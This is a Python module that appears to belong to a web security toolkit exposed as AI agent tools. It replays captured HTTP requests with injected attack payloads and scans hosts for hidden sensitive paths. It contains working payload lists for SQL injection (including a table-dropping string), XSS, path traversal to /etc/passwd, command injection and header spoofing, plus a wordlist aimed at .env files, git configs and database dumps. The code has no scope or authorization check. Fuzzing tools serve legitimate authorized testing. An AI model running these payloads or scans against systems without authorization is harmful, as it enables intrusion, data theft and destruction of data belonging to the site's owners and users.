"""Fuzzing tools: parameter fuzzing and endpoint discovery."""

from __future__ import annotations

import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

import storage.db as db

# ---------------------------------------------------------------------------
# Built-in payload sets
# ---------------------------------------------------------------------------

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL--",
    "1; DROP TABLE users--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "1' ORDER BY 1--",
    "admin'--",
    "') OR ('1'='1",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "'-alert(1)-'",
    "<img src=x onerror=prompt(1)>",
    '"><svg/onload=alert(String.fromCharCode(88,83,83))>',
    "{{7*7}}",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd%00",
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "& dir",
    "|| ping -c 1 127.0.0.1",
]

HEADER_INJECTION_PAYLOADS = [
    "localhost",
    "evil.com",
    "127.0.0.1",
    "0",
    "[::1]",
    "169.254.169.254",
]

PAYLOAD_SETS: dict[str, list[str]] = {
    "sqli": SQLI_PAYLOADS,
    "xss": XSS_PAYLOADS,
    "path_traversal": PATH_TRAVERSAL_PAYLOADS,
    "command_injection": COMMAND_INJECTION_PAYLOADS,
    "header_injection": HEADER_INJECTION_PAYLOADS,
}

# Common paths for endpoint discovery
COMMON_PATHS = [
    # Config / info leaks
    "/.env", "/.git/config", "/.git/HEAD", "/.gitignore",
    "/.svn/entries", "/.hg/hgrc",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/security.txt", "/.well-known/security.txt",
    "/humans.txt", "/ads.txt",
    # Server info
    "/server-status", "/server-info",
    "/info.php", "/phpinfo.php",
    "/_info", "/_health", "/health", "/healthz", "/ready",
    "/status", "/ping", "/version",
    # Admin panels
    "/admin", "/admin/", "/administrator",
    "/wp-admin/", "/wp-login.php",
    "/cpanel", "/phpmyadmin",
    "/manager/html", "/console",
    "/dashboard", "/panel",
    # API endpoints
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/graphql", "/graphiql",
    "/swagger.json", "/openapi.json",
    "/api-docs", "/swagger-ui.html",
    "/docs", "/redoc",
    # Debug / dev
    "/debug", "/trace", "/actuator",
    "/actuator/env", "/actuator/health",
    "/actuator/info", "/actuator/beans",
    "/elmah.axd", "/errorlog.axd",
    "/__debug__/", "/_profiler/",
    # Backup / sensitive files
    "/backup", "/backup.sql", "/db.sql",
    "/dump.sql", "/database.sql",
    "/config.yml", "/config.json", "/config.xml",
    "/application.yml", "/application.properties",
    "/web.config", "/appsettings.json",
    # Auth
    "/login", "/signin", "/signup", "/register",
    "/logout", "/oauth", "/token",
    "/forgot-password", "/reset-password",
    # Common frameworks
    "/wp-content/", "/wp-includes/",
    "/static/", "/assets/", "/public/",
    "/uploads/", "/media/", "/files/",
]

# Status codes that indicate something interesting
INTERESTING_STATUSES = {200, 201, 301, 302, 307, 308, 401, 403, 405}


def _send_request(
    url: str,
    method: str = "GET",
    headers: dict | None = None,
    body: bytes | None = None,
    timeout: int = 10,
) -> dict[str, Any]:
    """Send a single HTTP request and return a result dict."""
    start = time.time()
    req = urllib.request.Request(url, data=body, headers=headers or {}, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            resp_body = resp.read().decode("utf-8", errors="replace")
            return {
                "status": resp.status,
                "headers": dict(resp.headers),
                "body_snippet": resp_body[:2000],
                "body_length": len(resp_body),
                "duration_ms": round((time.time() - start) * 1000, 1),
                "error": None,
            }
    except urllib.error.HTTPError as e:
        err_body = ""
        try:
            err_body = e.read().decode("utf-8", errors="replace")[:2000]
        except Exception:
            pass
        return {
            "status": e.code,
            "headers": dict(e.headers) if e.headers else {},
            "body_snippet": err_body,
            "body_length": len(err_body),
            "duration_ms": round((time.time() - start) * 1000, 1),
            "error": str(e.reason),
        }
    except Exception as e:
        return {
            "status": None,
            "headers": {},
            "body_snippet": "",
            "body_length": 0,
            "duration_ms": round((time.time() - start) * 1000, 1),
            "error": str(e),
        }


def _detect_anomaly(baseline: dict, fuzzed: dict) -> list[str]:
    """Compare a fuzzed response to the baseline and flag anomalies."""
    flags = []
    if baseline["status"] != fuzzed["status"]:
        flags.append(f"status_changed:{baseline['status']}->{fuzzed['status']}")
    if fuzzed["status"] and fuzzed["status"] >= 500:
        flags.append("server_error")
    body = (fuzzed.get("body_snippet") or "").lower()
    # SQL error signatures
    sql_sigs = [
        "sql syntax", "mysql", "ora-", "postgresql", "sqlite",
        "unclosed quotation", "quoted string not properly terminated",
        "microsoft ole db", "odbc", "syntax error",
    ]
    for sig in sql_sigs:
        if sig in body:
            flags.append(f"sql_error_leak:{sig}")
            break
    # Stack traces
    trace_sigs = ["traceback", "stacktrace", "at line", "exception in"]
    for sig in trace_sigs:
        if sig in body:
            flags.append("stack_trace_leak")
            break
    # Reflection (XSS)
    if any(p.lower() in body for p in XSS_PAYLOADS[:4]):
        flags.append("payload_reflected")
    # Significant size difference (>3x or <0.3x)
    if baseline["body_length"] > 0 and fuzzed["body_length"] > 0:
        ratio = fuzzed["body_length"] / baseline["body_length"]
        if ratio > 3 or ratio < 0.3:
            flags.append(f"size_anomaly:ratio={ratio:.1f}")
    # Significant timing difference (>3x)
    if baseline["duration_ms"] > 0 and fuzzed["duration_ms"] > 0:
        time_ratio = fuzzed["duration_ms"] / baseline["duration_ms"]
        if time_ratio > 3:
            flags.append(f"timing_anomaly:ratio={time_ratio:.1f}")
    return flags


def register(mcp, helpers):
    _json = helpers["_json"]
    _tid = helpers["_tid"]

    @mcp.tool()
    def fuzz_request(
        request_id: int,
        fuzz_targets: str = "params",
        payload_types: str = "sqli,xss",
        custom_payloads: str | None = None,
        max_requests: int = 100,
    ) -> str:
        """Fuzz a captured request by injecting payloads into parameters.

        Takes a previously captured request and replays it with attack payloads
        injected into the specified targets.

        fuzz_targets: comma-separated list of what to fuzz:
          - params  : URL query parameters
          - body    : form/JSON body fields
          - headers : selected request headers (Cookie, Referer, User-Agent, X-Forwarded-For, Host)
          - path    : path segments

        payload_types: comma-separated from: sqli, xss, path_traversal, command_injection, header_injection

        custom_payloads: optional JSON array of additional payload strings

        max_requests: safety cap on total requests sent (default 100)

        Returns a list of findings with anomaly flags for each payload that
        triggered an interesting response change.
        """
        req = db.get_request_by_id(request_id, tenant_id=_tid())
        if not req:
            return _json({"error": "Request not found"})

        # Build payload list
        targets = [t.strip() for t in fuzz_targets.split(",")]
        types = [t.strip() for t in payload_types.split(",")]
        payloads: list[str] = []
        for pt in types:
            payloads.extend(PAYLOAD_SETS.get(pt, []))
        if custom_payloads:
            try:
                payloads.extend(json.loads(custom_payloads))
            except json.JSONDecodeError:
                return _json({"error": "custom_payloads must be a JSON array of strings"})
        if not payloads:
            return _json({"error": f"No payloads for types: {types}. Valid: {list(PAYLOAD_SETS.keys())}"})

        url = req["url"]
        method = req["method"]
        orig_headers = req.get("request_headers") or {}
        skip = {"host", "content-length", "transfer-encoding", "connection"}
        orig_headers = {k: v for k, v in orig_headers.items() if k.lower() not in skip}
        orig_body = req.get("request_body")

        # Get baseline response
        body_bytes = orig_body.encode("utf-8") if orig_body else None
        baseline = _send_request(url, method, orig_headers, body_bytes)

        findings: list[dict] = []
        total_sent = 0
        parsed = urllib.parse.urlparse(url)

        # --- Fuzz query params ---
        if "params" in targets:
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param_name, param_vals in qs.items():
                for payload in payloads:
                    if total_sent >= max_requests:
                        break
                    fuzzed_qs = dict(qs)
                    fuzzed_qs[param_name] = [payload]
                    new_query = urllib.parse.urlencode(fuzzed_qs, doseq=True)
                    fuzz_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                    result = _send_request(fuzz_url, method, orig_headers, body_bytes)
                    total_sent += 1
                    anomalies = _detect_anomaly(baseline, result)
                    if anomalies:
                        findings.append({
                            "target": "param",
                            "param": param_name,
                            "payload": payload,
                            "status": result["status"],
                            "anomalies": anomalies,
                            "duration_ms": result["duration_ms"],
                            "body_snippet": result["body_snippet"][:500],
                        })

        # --- Fuzz JSON body fields ---
        if "body" in targets and orig_body:
            try:
                body_json = json.loads(orig_body)
                if isinstance(body_json, dict):
                    for field_name in body_json:
                        for payload in payloads:
                            if total_sent >= max_requests:
                                break
                            fuzzed_body = dict(body_json)
                            fuzzed_body[field_name] = payload
                            fuzz_bytes = json.dumps(fuzzed_body).encode("utf-8")
                            hdr = dict(orig_headers)
                            hdr["Content-Type"] = "application/json"
                            result = _send_request(url, method, hdr, fuzz_bytes)
                            total_sent += 1
                            anomalies = _detect_anomaly(baseline, result)
                            if anomalies:
                                findings.append({
                                    "target": "body_field",
                                    "field": field_name,
                                    "payload": payload,
                                    "status": result["status"],
                                    "anomalies": anomalies,
                                    "duration_ms": result["duration_ms"],
                                    "body_snippet": result["body_snippet"][:500],
                                })
            except (json.JSONDecodeError, TypeError):
                # Try form-encoded
                try:
                    form_data = urllib.parse.parse_qs(orig_body, keep_blank_values=True)
                    for field_name in form_data:
                        for payload in payloads:
                            if total_sent >= max_requests:
                                break
                            fuzzed_form = dict(form_data)
                            fuzzed_form[field_name] = [payload]
                            fuzz_bytes = urllib.parse.urlencode(fuzzed_form, doseq=True).encode("utf-8")
                            hdr = dict(orig_headers)
                            hdr["Content-Type"] = "application/x-www-form-urlencoded"
                            result = _send_request(url, method, hdr, fuzz_bytes)
                            total_sent += 1
                            anomalies = _detect_anomaly(baseline, result)
                            if anomalies:
                                findings.append({
                                    "target": "form_field",
                                    "field": field_name,
                                    "payload": payload,
                                    "status": result["status"],
                                    "anomalies": anomalies,
                                    "duration_ms": result["duration_ms"],
                                    "body_snippet": result["body_snippet"][:500],
                                })
                except Exception:
                    pass

        # --- Fuzz headers ---
        if "headers" in targets:
            fuzzable_headers = ["Cookie", "Referer", "User-Agent", "X-Forwarded-For", "Host"]
            for hdr_name in fuzzable_headers:
                for payload in payloads:
                    if total_sent >= max_requests:
                        break
                    fuzzed_hdrs = dict(orig_headers)
                    fuzzed_hdrs[hdr_name] = payload
                    result = _send_request(url, method, fuzzed_hdrs, body_bytes)
                    total_sent += 1
                    anomalies = _detect_anomaly(baseline, result)
                    if anomalies:
                        findings.append({
                            "target": "header",
                            "header": hdr_name,
                            "payload": payload,
                            "status": result["status"],
                            "anomalies": anomalies,
                            "duration_ms": result["duration_ms"],
                            "body_snippet": result["body_snippet"][:500],
                        })

        # --- Fuzz path segments ---
        if "path" in targets:
            path_parts = [p for p in parsed.path.split("/") if p]
            for i, _part in enumerate(path_parts):
                for payload in payloads:
                    if total_sent >= max_requests:
                        break
                    fuzzed_parts = list(path_parts)
                    fuzzed_parts[i] = urllib.parse.quote(payload, safe="")
                    fuzz_path = "/" + "/".join(fuzzed_parts)
                    fuzz_url = urllib.parse.urlunparse(parsed._replace(path=fuzz_path))
                    result = _send_request(fuzz_url, method, orig_headers, body_bytes)
                    total_sent += 1
                    anomalies = _detect_anomaly(baseline, result)
                    if anomalies:
                        findings.append({
                            "target": "path_segment",
                            "segment_index": i,
                            "original": _part,
                            "payload": payload,
                            "status": result["status"],
                            "anomalies": anomalies,
                            "duration_ms": result["duration_ms"],
                            "body_snippet": result["body_snippet"][:500],
                        })

        return _json({
            "request_id": request_id,
            "url": url,
            "baseline_status": baseline["status"],
            "total_requests_sent": total_sent,
            "findings_count": len(findings),
            "findings": findings,
        })

    @mcp.tool()
    def discover_endpoints(
        target_url: str,
        wordlist: str = "builtin",
        custom_paths: str | None = None,
        method: str = "GET",
        max_requests: int = 200,
        include_status: str = "200,201,301,302,307,308,401,403,405",
    ) -> str:
        """Discover hidden endpoints and files on a target host.

        Sends requests to common paths (admin panels, config files, API docs,
        debug endpoints, backups, etc.) and reports which ones exist.

        target_url: base URL to scan, e.g. "https://example.com"
        wordlist: "builtin" uses the built-in path list, or "custom" to use only custom_paths
        custom_paths: optional JSON array of additional paths to try, e.g. '["/secret", "/api/debug"]'
        method: HTTP method to use (default GET)
        max_requests: safety cap (default 200)
        include_status: comma-separated status codes to report (default: 200,201,301,302,307,308,401,403,405)

        Returns discovered endpoints with status, headers, and body snippets.
        """
        # Normalize base URL
        base = target_url.rstrip("/")
        if not base.startswith("http"):
            base = "https://" + base

        # Build path list
        paths: list[str] = []
        if wordlist != "custom":
            paths.extend(COMMON_PATHS)
        if custom_paths:
            try:
                paths.extend(json.loads(custom_paths))
            except json.JSONDecodeError:
                return _json({"error": "custom_paths must be a JSON array of strings"})
        if not paths:
            return _json({"error": "No paths to scan"})

        report_statuses = set()
        for s in include_status.split(","):
            try:
                report_statuses.add(int(s.strip()))
            except ValueError:
                pass

        discovered: list[dict] = []
        errors: list[dict] = []
        total_sent = 0

        for path in paths:
            if total_sent >= max_requests:
                break
            if not path.startswith("/"):
                path = "/" + path
            url = base + path
            result = _send_request(url, method, timeout=10)
            total_sent += 1

            if result["error"] and result["status"] is None:
                errors.append({"path": path, "error": result["error"]})
                continue

            if result["status"] in report_statuses:
                entry = {
                    "path": path,
                    "url": url,
                    "status": result["status"],
                    "content_type": result["headers"].get("Content-Type", ""),
                    "content_length": result["body_length"],
                    "duration_ms": result["duration_ms"],
                    "server": result["headers"].get("Server", ""),
                }
                # Flag particularly interesting findings
                flags = []
                if result["status"] == 200:
                    flags.append("accessible")
                if result["status"] == 401:
                    flags.append("auth_required")
                if result["status"] == 403:
                    flags.append("forbidden_but_exists")
                if result["status"] in (301, 302, 307, 308):
                    loc = result["headers"].get("Location", "")
                    flags.append(f"redirect:{loc}")
                    entry["redirect_to"] = loc
                if any(kw in path for kw in [".env", ".git", "config", "backup", "dump"]):
                    flags.append("sensitive_file")
                if any(kw in path for kw in ["admin", "manager", "console", "dashboard"]):
                    flags.append("admin_panel")
                if any(kw in path for kw in ["swagger", "openapi", "api-docs", "graphql"]):
                    flags.append("api_docs")
                entry["flags"] = flags
                discovered.append(entry)

        return _json({
            "target": base,
            "total_requests_sent": total_sent,
            "discovered_count": len(discovered),
            "discovered": discovered,
            "errors_count": len(errors),
            "errors": errors[:20],
        })
